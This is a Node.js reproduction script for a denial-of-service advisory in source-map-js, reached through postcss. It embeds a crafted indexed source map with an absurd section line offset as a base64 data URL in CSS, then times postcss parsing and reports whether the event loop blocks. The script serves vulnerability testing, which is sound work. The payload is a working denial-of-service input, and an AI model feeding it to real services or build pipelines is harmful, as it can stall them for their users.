// Red-capable loop for GHSA-68fv-2mgg-jv7q reached THROUGH postcss.parse().
// Usage: node repro.js <path-to-node_modules-containing-postcss>
const path = require('path');
const Module = require('module');
const nmRoot = path.resolve(process.argv[2]);
Module.globalPaths.unshift(nmRoot);
process.env.NODE_PATH = nmRoot;
Module._initPaths();

const postcss = require(path.join(nmRoot, 'postcss'));
const smjVer = require(path.join(nmRoot, 'source-map-js/package.json')).version;

// Indexed source map ("sections") with an absurd per-section offset.line.
const evilMap = {
  version: 3,
  sections: [
    {
      offset: { line: 300000000, column: 0 },
      map: {
        version: 3,
        file: 'a.css',
        sources: ['a.css'],
        names: [],
        mappings: 'AAAA',
      },
    },
  ],
};
const b64 = Buffer.from(JSON.stringify(evilMap)).toString('base64');
const css = `a{color:red}\n/*# sourceMappingURL=data:application/json;base64,${b64} */`;

console.log(
  `source-map-js=${smjVer} postcss=${require(path.join(nmRoot, 'postcss/package.json')).version}`,
);

const mode = process.argv[3] || 'parse';

const t0 = Date.now();
let verdict;
try {
  if (mode === 'parse') {
    // Exactly what critters does: parse + stringify, no map generation.
    const ast = postcss.parse(css, { from: '/tmp/smj-repro/a.css' });
    let out = '';
    postcss.stringify(ast, (s) => {
      out += s;
    });
    verdict = 'parse+stringify ok, len=' + out.length;
  } else {
    // postcss asked to EMIT a source map, which consumes the prev map.
    const r = postcss([]).process(css, {
      from: '/tmp/smj-repro/a.css',
      to: '/tmp/smj-repro/b.css',
      map: { inline: false },
    });
    verdict = 'generated map, len=' + r.map.toString().length;
  }
} catch (e) {
  verdict = 'threw: ' + e.message.slice(0, 90);
}
const ms = Date.now() - t0;
console.log(`elapsed=${ms}ms verdict=${verdict}`);
// RED when the single synchronous parse blocks the event loop for > 1s.
if (ms > 1000) {
  console.log('RESULT: RED (event loop blocked by one parse)');
  process.exit(1);
}
console.log('RESULT: GREEN');
